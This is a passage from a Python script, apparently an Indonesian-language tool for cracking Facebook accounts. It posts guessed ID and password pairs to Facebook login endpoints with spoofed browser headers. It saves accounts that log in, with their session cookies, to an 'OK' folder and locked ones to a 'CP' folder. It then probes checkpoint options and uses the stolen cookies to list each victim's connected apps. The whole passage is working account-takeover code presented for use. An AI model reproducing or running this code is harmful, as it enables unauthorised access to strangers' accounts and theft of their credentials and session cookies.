cope%3Demail%252Cpublic_profile%26sdk%3Djoey%26version%3Dv10.0%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df2f6bc9c8eab7d%26domain%3Dbima.tri.co.id%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fbima.tri.co.id%252Ffb18eec589d49c%26relation%3Dopener%26frame%3Df1db658b4f80dec%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr',
'Accept-Encoding': 'gzip, deflate, br',
'Accept-Language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
			po = ses.post('https://m.facebook.com/login/device-based/login/async/?api_key=822564807908213&auth_token=7f8207f57b5a08a327231ca0d8b164a1&skip_api_login=1&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv10.0%2Fdialog%2Foauth%3Fapp_id%3D822564807908213%26cbt%3D1702843945952%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df3fb2aa703a8c74%2526domain%253Dbima.tri.co.id%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fbima.tri.co.id%25252Ffb18eec589d49c%2526relation%253Dopener%26client_id%3D822564807908213%26display%3Dtouch%26domain%3Dbima.tri.co.id%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fbima.tri.co.id%252Flogin%26fields%3Dname%252Cemail%252Cpicture%252Cfirst_name%252Clast_name%26locale%3Den_US%26logger_id%3Df28ffc7ad51a064%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df2f6bc9c8eab7d%2526domain%253Dbima.tri.co.id%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fbima.tri.co.id%25252Ffb18eec589d49c%2526relation%253Dopener%2526frame%253Df1db658b4f80dec%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26scope%3Demail%252Cpublic_profile%26sdk%3Djoey%26version%3Dv10.0%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&refsrc=deprecated&app_id=822564807908213&cancel=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df2f6bc9c8eab7d%26domain%3Dbima.tri.co.id%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fbima.tri.co.id%252Ffb18eec589d49c%26relation%3Dopener%26frame%3Df1db658b4f80dec%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&lwv=100',data=dataa,headers=heade,allow_redirects=False)
			if "checkpoint" in po.cookies.get_dict().keys():
			    if 'no' in gabriel:
			        cp+=1
			        print(f'\r[{k}CP{x}] {K}{idf}|{pw}{x}\n{x}{ua}\n')
			        open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
			        akun.append(idf+'|'+pw)
			        break
			    elif 'ya' in gabriel:
			        cp+=1
			        print(f'\r[{k}CP{x}] {K}{idf}|{pw}{x}\n{x}{ua}\n')
			        open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
			        akun.append(idf+'|'+pw)
			        ceker(idf,pw)
			        break
			elif "c_user" in ses.cookies.get_dict().keys():
				if 'no' in taplikasi:
					ok+=1
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					print(f'\r[{h}OK{x}] {H}{idf}|{pw}\n{P}{H}{kuki}\n{H}{ua}{P}\n')
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					break
				elif 'ya' in taplikasi:
					ok+=1
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					print(f'\r[{h}OK{x}] {H}{idf}|{pw}\n{P}{H}{kuki}\n{H}{ua}{P}\n')
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					cek_apk(kuki)
					break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
	
# chek OPSI #
def ceker(idf,pw):
	global cp
	ua = 'Mozilla/5.0 (Linux; Android 12; CPH2089 Build/RKQ1.211103.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/404.0.0.35.70;]'
	head = {"Host": "mbasic.facebook.com","cache-control": "max-age=0","upgrade-insecure-requests": "1","origin": "https://mbasic.facebook.com","content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "mark.via.gp","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": "https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
	ses = requests.Session()
	try:
		hi = ses.get('https://mbasic.facebook.com')
		ho = sop(ses.post('https://mbasic.facebook.com/login.php', data={'email':idf,'pass':pw,'login':'submit'}, headers=head, allow_redirects=True).text,'html.parser')
		jo = ho.find('form')
		data = {}
		lion = ['nh','jazoest','fb_dtsg','submit[Continue]','checkpoint_data']
		for anj in jo('input'):
			if anj.get('name') in lion:
				data.update({anj.get('name'):anj.get('value')})
		kent = sop(ses.post('https://mbasic.facebook.com'+str(jo['action']), data=data, headers=head).text,'html.parser')
		print('\r%s    [+] Opsi CheckPoint :   %s'%(b,idf,pw,x))
		open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
		opsi = kent.find_all('option')
		if len(opsi)==0:
			print('\r%s    [+] Tap Yes / A2F [ Cek Login Di Lite/Mbasic%s ]'%(hh,x))
		else:
			for opsii in opsi:
				print('\r%s   [+] %s%s'%(kk,opsii.text,x))
	except Exception as c:
		print('\r%s    [+] Tidak Dapat Mengecek Opsi [ Cek Login Di Lite/Mbasic ]%s'%(u,x))
		open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
		
######-------------------[ CHEK APK ]-----------------########
def cek_apk(kuki):
	session = requests.Session()
	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":"noscript=1;"+kuki}).text
	sop = bs4.BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	try:
		for i in range(len(game)):
			print ("\r%s  \033[0m              ➛ %s%s"%(P,H,game[i].replace("Ditambahkan pada"," Ditambahkan pada")))
	except AttributeError:
		print ("\r    %s\033[0m cookie invalid"%(M))
	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":"noscript=1;"+kuki}).text
	sop = bs4.BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	try:
		for i in range(len(game)):
			print ("\r%s  \033[0m              ➛ %s"%(P,game[i].replace("Kedaluwarsa"," Kedaluwarsa")))
	except AttributeError:
		print ("\r    %s \033[0mcookie invalid"%(M))


#-----------------------[ SYSTEM-CONTROL ]--------------------#
if __name__=='__main__':
#	try:os.system('git pull')
#	except:pass
	try:os.mkdir('OK')
	except:pass
	try:os.mkdir('CP')
	except:pass
	try:os.system('touch .prox.txt')
	except:pass
	login()
